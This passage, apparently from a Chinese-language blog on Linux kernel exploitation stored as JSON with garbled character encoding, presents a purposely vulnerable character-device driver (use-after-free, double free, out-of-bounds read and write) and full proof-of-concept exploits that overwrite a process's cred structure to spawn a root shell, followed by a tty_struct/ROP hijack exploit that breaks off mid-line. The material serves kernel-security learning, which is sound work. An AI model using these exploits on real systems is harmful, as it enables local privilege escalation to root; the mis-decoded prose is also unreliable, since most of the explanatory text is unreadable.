*from, unsigned long n)\n```\n\n##### `copy_to_user`:\n\n```c\ncopy_to_user(void __user *to, const void *from, unsigned long n)\n```\n\nè¿™ä¸¤ä¸ªå°±ä¸è®²äº†ï¼Œé¡¾åæ€ä¹‰ã€‚\n\n##### æ³¨å†Œå‡½æ•°\n\nå‰©ä¸‹çš„å¥½å¤šå°±æ˜¯å¸¸è§çš„æ³¨å†Œå‡½æ•°äº†\n\n```C\nalloc_chrdev_region(&t_dev, 0, 1, \"xxx\");//åŠ¨æ€åˆ†é…ä¸»è®¾å¤‡å·\nunregister_chrdev_region(t_dev, 1);//ç§»é™¤æ¨¡å—æ—¶é‡Šæ”¾è®¾å¤‡å·\nxxx_class = class_create(THIS_MODULE, \"xxx\");\ndevice_create(xxx_class, NULL, devno, NULL, \"xxx\");\ncdev_init(&c_dev, &pugs_fops);\ncdev_add(&c_dev, t_dev, 1);\n```\n\n\n\n## 2.globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨\n\nè¿™ä¸ªä¸å¤ªæ¸…æ¥šï¼Œé¢˜ç›®è§çš„ä¹Ÿå°‘ï¼Œå…ˆå¿½ç•¥ã€‚\n\n\n\n## 3.å—è®¾å¤‡\n\n### register_blkdev\n\nç”³è¯·è®¾å¤‡å·\n\n```\nint ret = register_blkdev(xxx_dev_no,DEV_NAME);\n```\n\n- å¦‚æœ`xxx_dev_no`ä¸º0åˆ™ç”±è¯¥å‡½æ•°è‡ªåŠ¨åˆ†é…è®¾å¤‡å·ï¼Œretå³ä¸ºè¿”å›çš„è®¾å¤‡å·\n- `xxx_dev_no`ä¸ä¸º0åˆ™ä¾æ®è¯¥è®¾å¤‡å·è¿›è¡Œåˆ†é…\n\n### unregister_blkdev\n\né‡Šæ”¾è®¾å¤‡å·\n\n```\nunregister_blkdev(xxx_dev_no,DEV_NAME);\n```\n\n\n\n[printk()å‡½æ•°çš„æ€»ç»“ - æ·±è“å·¥ä½œå®¤ - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/king-77024128/articles/2262023.html)\n\n[Linux kernel pwn notesï¼ˆå†…æ ¸æ¼æ´åˆ©ç”¨å­¦ä¹ ï¼‰ - hac425 - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/hac425/p/9416886.html)\n\n[Linuxè®¾å¤‡é©±åŠ¨ï¼ˆäºŒï¼‰å­—ç¬¦è®¾å¤‡é©±åŠ¨ | BruceFan's Blog (pwn4.fun)](http://pwn4.fun/2016/10/21/Linuxè®¾å¤‡é©±åŠ¨ï¼ˆäºŒï¼‰å­—ç¬¦è®¾å¤‡é©±åŠ¨/)\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"pwnKernelä»0å¼€å§‹(ä¸‰)","url":"/2021/09/06/Kernelä»0å¼€å§‹(ä¸‰)/","content":"\n\n\n# å‰è¨€\n\nè¿™é‡Œå°±å°è¯•ç”¨å †æ¥è§£é¢˜ï¼Œç”±äºkernelçš„è§£æ³•å¤šç§å¤šæ ·ï¼Œè¿™é‡Œæˆ‘ä»¬ä»æœ€ç®€å•çš„UAFå…¥æ‰‹\n\nç»™å‡ºè‡ªå·±è®¾è®¡çš„å †é¢˜ç›®ï¼Œå­˜åœ¨å¾ˆå¤šçš„æ¼æ´ï¼Œreadè¶Šç•Œè¯»ï¼Œeditè¶Šç•Œå†™ï¼ŒUAFï¼ŒDouble Freeç­‰ï¼š\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡\n//static char *buffer_var = NULL;\nstatic char *buffer_var = NULL;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t stack_dev_no;\n\n\nstruct note\n{\n    int idx;\n    int len;\n    char* data;\n};\n\n\n//static char* notelist[1000];\nstatic char* notelist[1000];\nstatic struct note* noteChunk;\nstatic int count = 0;\n\n\n\nstatic ssize_t stack_read(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos);\n\nstatic ssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos);\n\nstatic long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\nstatic int stack_open(struct inode *i, struct file *f);\n\nstatic int stack_close(struct inode *i, struct file *f);\n\n\n\nstatic struct file_operations stack_fops =\n        {\n                .owner = THIS_MODULE,\n                .open = stack_open,\n                .release = stack_close,\n                .write = stack_write,\n                .read = stack_read,\n                .unlocked_ioctl = stack_ioctl\n        };\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°\nstatic int __init stack_init(void)\n{\n    printk(KERN_INFO \"[i] Module stack registered\");\n    if (alloc_chrdev_region(&stack_dev_no, 0, 1, \"stack\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, stack_dev_no, NULL, \"stack\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module stack error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &stack_fops);\n    if (cdev_add(&cdev, stack_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, stack_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(stack_dev_no), MINOR(stack_dev_no));\n    return 0;\n}\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°\nstatic void __exit stack_exit(void)\n{\n    // é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·\n    unregister_chrdev_region(stack_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n// è¯»è®¾å¤‡\nssize_t stack_read(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos)\n{\n    printk(KERN_INFO \"Stack_read function\" );\n    copy_to_user(buf,buffer_var,len);\n}\n\n// å†™è®¾å¤‡\nssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos)  //buffer overflow\n{\n    printk(KERN_INFO \"Stack_write function\" );\n    copy_from_user(buffer_var, buf, len);\n    printk(\"[i] Module stack write: %s\\n\",buffer_var);\n    return len;\n}\n\n\n\n// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶\nlong stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    char* chunk = NULL;\n    int retval = 0;\n    printk(KERN_INFO \"Ioctl Get!\\n\");\n    printk(\"notelist_addr:0x%llx\\n\",&notelist[0]);\n    switch (cmd) {\n\n        case 1://add\n            //noteChunk = (char *)kmalloc(sizeof(struct Note),GFP_KERNEL);\n            //copy_from_user(noteChunk, arg, sizeof(struct Note));\n\n            printk(\"Kernel Add function!---001\\n\");\n            noteChunk = (struct Note*)arg;\n            chunk = (char *)kmalloc(noteChunk->len,GFP_KERNEL);\n            printk(\"chunk_addr:0x%llx\\n\",chunk);\n            if (!chunk)\n            {\n                printk(\"Alloca Error\\n\");\n                return 0;\n            }\n            memcpy(chunk, noteChunk->data,noteChunk->len);\n            notelist[count] = chunk;\n            chunk = NULL;\n            count ++;\n            printk(\"Add Success!\\n\");\n            break;\n\n        case 888: //free without clean point and data\n            printk(\"Kernel Free function!---888\\n\");\n            noteChunk = (struct Note*)arg;\n            printk(\"notelist:0x%llx\\n\",notelist[noteChunk->idx]);\n            if (notelist[noteChunk->idx])\n            {\n                kfree(notelist[noteChunk->idx]);\n                //notelist[noteChunk->idx] = NULL;\n                printk(\"Free Success!\\n\");\n            }\n            else\n            {\n                printk(\"You can't free it!There is no chunk!\\n\");\n            }\n            break;\n\n        case 3://edit   //UAF and overflow\n            printk(\"Kernel Edit function!---003\\n\");\n            noteChunk = (struct Note*)arg;\n            if (notelist[noteChunk->idx])\n            {\n                memcpy(notelist[noteChunk->idx], noteChunk->data,noteChunk->len);\n                printk(\"Edit Success!\\n\");\n            }\n            else\n            {\n                printk(\"You can't edit it!There is no chunk!\\n\");\n            }\n            break;\n \n        case 4://read   //over read\n            printk(\"Kernel Read function!---004\\n\");\n            noteChunk = (struct Note*)arg;\n            if(notelist[noteChunk->idx]){\n                copy_to_user(noteChunk->data,notelist[noteChunk->idx],noteChunk->len);\n                printk(\"Read Success!\\n\");\n            }\n            break;\n\n        case 111: //Test add chunk\n            printk(\"Test add chunk!---111\\n\");\n            printk(KERN_INFO \"No buffer_var!Malloc now!\" );\n            buffer_var=(char*)kmalloc(0xa8,GFP_KERNEL);\n            printk(\"buffer_var:0x%llx\\n\",buffer_var);\n            break;\n\n        default:\n            retval = -1;\n            break;\n    }    \n\n    return retval;\n}\n\n\nstatic int stack_open(struct inode *i, struct file *f)\n{\n    printk(KERN_INFO \"[i] Module stack: open()\\n\");\n    return 0;\n}\n\nstatic int stack_close(struct inode *i, struct file *f)\n{\n    kfree(buffer_var);\n    //buffer_var = NULL;\n    printk(KERN_INFO \"[i] Module stack: close()\\n\");\n    return 0;\n}\n\nmodule_init(stack_init);\nmodule_exit(stack_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n# ä¸€ã€åˆ©ç”¨Credç»“æ„ä½“ææƒ\n\n## 1.æ­£å¸¸UAF\n\n### å‰ç½®çŸ¥è¯†\n\nç”±äºæ˜¯UAFæ¼æ´ï¼Œæ‰€ä»¥ç›´æ¥å°è¯•å†é‡å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ ·æ–°è¿›ç¨‹å¯åŠ¨æ—¶å°±ä¼šç”³è¯·ä¸€ä¸ªCredç»“æ„ä½“(è¿™é‡Œå¤§å°ä¸º0xa8)ã€‚è€Œå¦‚æœæ­¤æ—¶ç”³è¯·çš„ç»“æ„ä½“æ°å¥½è½åœ¨æˆ‘ä»¬é‡Šæ”¾è¿‡çš„å †å—ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨UAFæ¼æ´ä¿®æ”¹Credç»“æ„ä½“ï¼Œå°†å…¶uidå’Œgidæ”¹ä¸º0ï¼Œå†åˆ©ç”¨è¯¥è¿›ç¨‹åŸåœ°èµ·shellï¼Œå°±èƒ½è·å¾—rootæƒé™çš„shelläº†ã€‚\n\nè¿™é‡ŒåŒæ ·éœ€è¦ä¸€ç‚¹å‰ç½®çŸ¥è¯†ï¼Œä¹‹å‰ä¹Ÿå†™è¿‡ç±»ä¼¼çš„ï¼Œå…¶å®å°±ç›¸å½“äºä¿®æ”¹æŸä¸ªè¿›ç¨‹çš„credç»“æ„ä½“ä¸­çš„uidå’Œgidå°±èƒ½å°†è¯¥è¿›ç¨‹ææƒäº†ï¼Œä¹‹ååˆ©ç”¨ææƒåçš„è¿›ç¨‹èµ·shellå¾—åˆ°çš„shellå°±æ˜¯ææƒåçš„shellã€‚\n\næ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œç›´æ¥ç»™\n\n### POC\n\n```C\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\nstruct addNote\n{\n    size_t len;\n    char* data;\n};\n\nstruct editNote\n{\n    size_t idx;\n    size_t len;\n    char* data;\n};\n\n\n\n//open dev\nint openDev(char* pos);\nvoid addFun(int fd,struct addNote* arg);\nvoid freeFun(int fd,struct editNote* arg);\nvoid editFun(int fd,struct editNote* arg);\nvoid readFun(int fd,struct editNote* arg);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    int idFork;\n    unsigned long memOffset;\n    struct addNote addChunk;\n    struct editNote readChunk;\n    struct editNote editChunk;\n\n    //open Dev\n    char* pos = \"/dev/stack\";\n    fd = openDev(pos);\n    \n    char credBuf[0xa8] = {0};\n    addChunk.len = 0xa8;\n    addChunk.data = credBuf;\n    addFun(fd,&addChunk);\n    \n    editChunk.idx = 0;\n    freeFun(fd,&editChunk);\n    \n    idFork = fork();\n    editChunk.data = credBuf;\n    editChunk.len = 28;\n    if(idFork == 0){\n        //get into 28*0 to set uid and gid 0\n        editFun(fd,&editChunk);     \n        if(getuid() == 0){\n            printf(\"[*]welcome root:\\n\");\n            system(\"/bin/sh\");\n            return 0;\n        }\n    }\n    else if(idFork < 0){\n        printf(\"[*]fork fail\\n\");\n    }\n    else{\n        wait(NULL);\n    }\n    \n    return 0;\n\n}\n\n\nint openDev(char* pos){\n    int fd;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((fd = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return fd;\n}\n\nvoid addFun(int fd, struct addNote* arg)\n{\n    ioctl(fd,1,arg);\n}\n\nvoid freeFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,888,arg);\n}\n\nvoid editFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,3,arg);\n}\n\nvoid readFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,4,arg);\n}\n```\n\nè¿™é‡Œè¿˜éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œcredç»“æ„ä½“å¤§å°åœ¨æˆ‘ç¼–è¯‘çš„4.4.72ä¸­ä¸º0xa8ï¼Œåœ¨ä¸åŒå†…æ ¸ç‰ˆæœ¬å¯èƒ½ä¸åŒï¼Œé€šå¸¸å¯ä»¥æŸ¥çœ‹å¯¹åº”ç‰ˆæœ¬çš„Linuxå†…æ ¸æºç æˆ–è€…å†™ä¸ªç®€ä¾¿çš„Cç¨‹åºè¿è¡Œä¸€ä¸‹å³å¯çŸ¥é“ã€‚\n\n## 2.ä¼ªæ¡ä»¶ç«äº‰é€ æˆçš„UAF(å¤šè¿›ç¨‹)\n\n### å‰ç½®çŸ¥è¯†\n\nå‰é¢æˆ‘ä»¬çš„UAFæ˜¯æ­£å¸¸çš„æŒ‡é’ˆæœªç½®ç©ºçš„UAFï¼Œä½†å¦‚æœåœ¨ç¨‹åºä¸­æ˜¯addå‡½æ•°ç”³è¯·chunkï¼Œåªæœ‰åœ¨å…³é—­è®¾å¤‡æ—¶æ‰ä¼šé‡Šæ”¾chunkã€‚é‚£ä¹ˆè¿™æ ·å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªè®¾å¤‡è¿›è¡Œæ“ä½œæ—¶ï¼Œåªæœ‰åœ¨å…³é—­è®¾å¤‡æ—¶æ‰èƒ½é‡Šæ”¾chunkï¼Œè¿™å°±æ— æ³•æ˜¾è‘—åœ°é€ æˆUAFã€‚ä½†æ˜¯å¦‚æœèƒ½å¤Ÿå¯¹åŒä¸€ä¸ªè®¾å¤‡æ‰“å¼€ä¸¤æ¬¡  (æ“ä½œç¬¦åˆ†åˆ«ä¸ºfd1,fd2) ï¼Œç”³è¯·ä¸€ä¸ªå †å—åï¼Œå…³é—­æ‰ç¬¬ä¸€ä¸ªè®¾å¤‡fd1åï¼Œå°±èƒ½é‡Šæ”¾è¯¥å †å—ã€‚ä¹‹ååˆ©ç”¨fd2ç»§ç»­å¯¹è®¾å¤‡è¿›è¡Œå†™æ“ä½œï¼Œå°±èƒ½å¤Ÿç»§ç»­ä¿®æ”¹é‡Šæ”¾æ‰çš„å †å—äº†ï¼Œè¿™æ ·å°±é€ æˆäº†ä¸€ä¸ªUAFæ¼æ´ã€‚åŒæ ·ä¹Ÿæ˜¯åˆ©ç”¨credç»“æ„ä½“è¿›è¡Œææƒã€‚\n\nåŒæ ·ç›´æ¥ç»™å‡ºpocå³å¯\n\n### POC\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\n\n\n\nstruct addNote\n{\n    size_t len;\n    char* data;\n};\n\nstruct editNote\n{\n    size_t idx;\n    size_t len;\n    char* data;\n};\n\n\n//open dev\nint openDev(char* pos);\nvoid addFun(int fd,struct addNote* arg);\nvoid freeFun(int fd,struct editNote* arg);\nvoid editFun(int fd,struct editNote* arg);\nvoid readFun(int fd,struct editNote* arg);\n\n\nint main(int argc, char *argv[])\n{\n    int fd1,fd2;\n    int idFork,idBefore;\n    unsigned long memOffset;\n    struct addNote addChunk;\n    struct editNote readChunk;\n    struct editNote editChunk;\n    //char *mycred;\n\n    //mycred = current_user_ns();\n    //printf(\"Cred_addr:0x%llx\\n\",mycred);\n    \n    //open Dev\n    char* pos = \"/dev/stack\";\n    char credBuf[0xa8] = {0};\n    fd1 = openDev(pos);\n    fd2 = openDev(pos);\n    ioctl(fd1,111,editChunk); //test add\n    close(fd1);\n    \n    idFork = fork();\n    printf(\"idFork:%d\\n\",idFork);\n    \n    if(idFork == 0){\n        //get into 28*0 to set uid and gid 0\n        idBefore = getuid();\n        printf(\"Before uid:%d\\n\",idBefore);\n        write(fd2, credBuf, 28);\n        \n        if(getuid() == 0){\n            printf(\"[*]welcome root:\\n\");\n            system(\"/bin/sh\");\n            return 0;\n        }\n    }\n    else if(idFork < 0){\n        printf(\"[*]fork fail\\n\");\n    }\n    else{\n        wait(NULL);\n    }\n    \n    return 0;\n\n}\n\n\nint openDev(char* pos){\n    int fd;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((fd = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return fd;\n}\n\nvoid addFun(int fd, struct addNote* arg)\n{\n    ioctl(fd,1,arg);\n}\n\nvoid freeFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,888,arg);\n}\n\nvoid editFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,3,arg);\n}\n\nvoid readFun(int fd, struct editNote* arg)\n{\n    ioctl(fd,4,arg);\n}\n\n\n```\n\n\n\n\n\n# äºŒã€åŠ«æŒtty_structç»“æ„ä½“\n\nè¿™ä¸ªçœŸæ˜¯è°ƒäº†æˆ‘æ— æ•Œä¹…ã€‚\n\n## åŸç†\n\n### 1.å‡½æ•°è°ƒç”¨é“¾\n\n`entry_SYSCALL_64`->`SyS_write`->`SYSC_write`->`vfs_write`\n\n->`__vfs_write`->`tty_write`->`do_tty_write`->`n_tty_write`->`pty_write`\n\nè¿™é‡Œæˆ‘ä»¬éœ€è¦çš„å°±æ˜¯åŠ«æŒæŸä¸ªç»“æ„ä½“ï¼Œä»è€Œä½¿å¾—åŸæœ¬é€šè¿‡è¯¥ç»“æ„ä½“è°ƒç”¨`pty_write`å‡½æ•°æŒ‡é’ˆå˜ä¸ºè°ƒç”¨æˆ‘ä»¬çš„ROPé“¾æ¡ã€‚\n\n### 2.åŠ«æŒæ ˆ\n\nç”±äºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´å¾—è¿”å›è¿›å…¥éœ€è¦ç”¨åˆ°æ ˆï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦è¿›è¡Œæ ˆåŠ«æŒï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“é€šè¿‡ptmxè¿›å…¥å…¶writeå‡½æ•°æ—¶ï¼Œraxä¸ºä»tty_structä¸­è·å–çš„operations* opsæŒ‡é’ˆï¼Œè€Œæ­¤æ—¶è¯¥æŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬åŠ«æŒäº†ï¼Œæ‰€ä»¥å¦‚æœæœ‰ç±»ä¼¼äºmov rsp,raxä¹‹ç±»çš„gadgetå°±èƒ½å°†æ ˆåŠ«æŒåˆ°æˆ‘ä»¬å¯æ§çš„operations* opsæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å¤„ï¼Œé‚£ä¹ˆä¹‹åå°±å¾ˆå®¹æ˜“è¿›è¡Œå†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„è½¬æ¢ã€‚\n\nè¿™é‡Œå°±ç”¨åˆ°å¸¸ç”¨çš„ä¸€ä¸ªgadget\n\nmovRspRax_decEbx_ret\n\n![image-20211011000008800](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211011000009.png)\n\n### 3.ç»“æ„ä½“\n\nè¿™ä¸ªä¹‹å‰ä¹Ÿæ˜¯è®²è¿‡çš„\n\n```c\nstruct tty_struct {\n    int magic;\n    struct kref kref;\n    struct device *dev;\n    struct tty_driver *driver;\n    const struct tty_operations *ops;\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n    struct ld_semaphore ldisc_sem;\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n    struct mutex legacy_mutex;\n    struct mutex throttle_mutex;\n    struct rw_semaphore termios_rwsem;\n    struct mutex winsize_mutex;\n    spinlock_t ctrl_lock;\n    spinlock_t flow_lock;\n    /* Termios values are protected by the termios rwsem */\n    struct ktermios termios, termios_locked;\n    struct termiox *termiox; /* May be NULL for unsupported */\n    char name[64];\n    struct pid *pgrp; /* Protected by ctrl lock */\n    struct pid *session;\n    unsigned long flags;\n    int count;\n    struct winsize winsize; /* winsize_mutex */\n    unsigned long stopped:1, /* flow_lock */\n        flow_stopped:1,\n        unused:BITS_PER_LONG - 2;\n    int hw_stopped;\n    unsigned long ctrl_status:8, /* ctrl_lock */\n        packet:1,\n        unused_ctrl:BITS_PER_LONG - 9;\n    unsigned int receive_room; /* Bytes free for queue */\n    int flow_change;\n\n    struct tty_struct *link;\n    struct fasync_struct *fasync;\n    int alt_speed; /* For magic substitution of 38400 bps */\n    wait_queue_head_t write_wait;\n    wait_queue_head_t read_wait;\n    struct work_struct hangup_work;\n    void *disc_data;\n    void *driver_data;\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n    unsigned char *write_buf;\n    int write_cnt;\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n    struct work_struct SAK_work;\n    struct tty_port *port;\n};\n```\n\nå½“æˆ‘ä»¬æ‰“å¼€ptmxè®¾å¤‡æ—¶ï¼Œä¼šä½¿ç”¨kmallocç”³è¯·è¿™ä¸ªtty_structç»“æ„ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªUAFæ¼æ´ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è¯¥tty_structç”³è¯·ä¸ºæˆ‘ä»¬é‡Šæ”¾æ‰çš„ä¸€ä¸ªchunkï¼Œå…¶ä¸­é‡è¦çš„æ˜¯int magic;å’Œconst struct tty_operations *ops;è¿™ä¸¤ä¸ªç»“æ„ä½“æˆå‘˜ã€‚\n\n#### magicæˆå‘˜\n\nè¿™ä¸ªåœ¨ç½‘ä¸Šå¾ˆå¤šäººéƒ½ç›´æ¥å°†å…¶è®¾ç½®ä¸º0ï¼Œä½†æ˜¯åœ¨æŸäº›ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœç›´æ¥è®¾ç½®ä¸º0ï¼Œé€šå¸¸å¯èƒ½å‡ºç°ä»¥ä¸‹çš„é”™è¯¯ï¼š\n\n![image-20211010233205104](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233212.png)\n\nä¹Ÿå°±æ˜¯magic numberæ£€æµ‹é”™è¯¯ï¼Œè¿™ä¸ªç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå®é™…ç”³è¯·ç»“æ„ä½“ä¹‹åæ˜¯ä¸å˜çš„ï¼š\n\n![Snipaste_2021-10-10_23-37-19](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233737.png)\n\nå¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„æ•°å€¼\n\n![image-20211010233844033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233844.png)\n\nè¿™ä¸ªåœ¨åé¢çš„æ•°å€¼è®¾ç½®ä¸­å¯ä»¥ç”¨åˆ°ï¼Œéœ€è¦æˆ‘ä»¬æ¥è°ƒè¯•æ‰å¯ä»¥ï¼Œä¸ç„¶å…¶å®å¦‚æœç›´æ¥è®¾ç½®ä¸º0ä¹Ÿå®¹æ˜“å‡ºé”™ã€‚\n\nå¦å¤–å…¶ä¸­çš„driverå¯ä»¥è®¾ç½®ä¸º0ï¼Œæ‰€ä»¥ä¸€èˆ¬ç›´æ¥è®¾ç½®tty_struct[3]å’Œtty_struct[0]å³å¯ã€‚\n\n#### opsæˆå‘˜\n\nè¿™ä¸ªconst struct tty_operations *opsç»“æ„ä½“æŒ‡é’ˆåœ¨è¯¥åšæ³•é‡Œè¢«åŠ«æŒä¸ºæˆ‘ä»¬è®¾ç½®fake_operationsæŒ‡é’ˆï¼Œæœ‰å¦‚ä¸‹ç»“æ„ä½“ï¼Œè®¾ç½®fake_operationsä¸­çš„writeå‡½æ•°æŒ‡é’ˆä¸ºROPé“¾æ¡ï¼Œå°±å¯ä»¥é€šè¿‡è°ƒç”¨ptmxè®¾å¤‡ä¸­çš„writeå‡½æ•°ï¼Œä»è€Œè°ƒç”¨åˆ°æˆ‘ä»¬è®¾ç½®çš„ROPé“¾æ¡ã€‚\n\n```c\nstruct tty_operations {\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n    struct inode *inode, int idx);\n    int (*install)(struct tty_driver *driver, struct tty_struct *tty);\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n    int (*open)(struct tty_struct * tty, struct file * filp);\n    void (*close)(struct tty_struct * tty, struct file * filp);\n    void (*shutdown)(struct tty_struct *tty);\n    void (*cleanup)(struct tty_struct *tty);\n    int (*write)(struct tty_struct * tty,\n        const unsigned char *buf, int count);\n    int (*put_char)(struct tty_struct *tty, unsigned char ch);\n    void (*flush_chars)(struct tty_struct *tty);\n    int (*write_room)(struct tty_struct *tty);\n    int (*chars_in_buffer)(struct tty_struct *tty);\n    int (*ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    long (*compat_ioctl)(struct tty_struct *tty,\n        unsigned int cmd, unsigned long arg);\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n    void (*throttle)(struct tty_struct * tty);\n    void (*unthrottle)(struct tty_struct * tty);\n    void (*stop)(struct tty_struct *tty);\n    void (*start)(struct tty_struct *tty);\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n    void (*flush_buffer)(struct tty_struct *tty);\n    void (*set_ldisc)(struct tty_struct *tty);\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n    int (*tiocmget)(struct tty_struct *tty);\n    int (*tiocmset)(struct tty_struct *tty,\n        unsigned int set, unsigned int clear);\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n    int (*get_icount)(struct tty_struct *tty,\n    struct serial_icounter_struct *icount);\n#ifdef CONFIG_CONSOLE_POLL\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n#endif\n    const struct file_operations *proc_fops;\n};\n```\n\n\n\n![image-20211010234216013](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010234216.png)\n\n### 4.æœ€ç»ˆç»“æ„\n\n#### fake_tty_structç»“æ„ä½“\n\n![image-20211010235017786](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235018.png)\n\n#### fake_tty_operationç»“æ„ä½“\n\n![image-20211010235311913](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235328.png)\n\n![image-20211010235416812](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235417.png)\n\n## POC\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <linux/tty.h>\n\n\nstruct cred;\nstruct task_struct;\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long user_sp;\n\n#define tty_size 0x2e0\n\n\nstruct addNote\n{\n    size_t len;\n    char* data;\n};\n\nstruct editNote\n{\n    size_t idx;\n    size_t len;\n    char* data;\n};\n\n\n\n//ROP func\nunsigned long findAddr();\nvoid save_state();\nvoid getroot (void);\nvoid shell(void);\n\n//open dev\nint openDev(char* pos);\nvoid addFun(int fd,struct addNote* arg);\nvoid freeFun(int fd,struct editNote* arg);\nvoid editFun(int fd,struct editNote* arg);\nvoid readFun(int fd,struct editNote* arg);\n\n\nint main(int argc, char *argv[])\n{\n    int fd,fd_tty;\n    char buf[0x10];\n    int i = 0;\n    unsigned long memOffset;\n    struct addNote addChunk;\n    struct editNote readChunk;\n    struct editNote editChunk;\n\n    unsigned long smpOffset = 0x1146000;\n    memOffset = findAddr();\n    \n    //debug kernel\n    unsigned long vmBase = memOffset - smpOffset;\n    unsigned long pop_rdi_ret = vmBase + 0x3d032d;\n    unsigned long 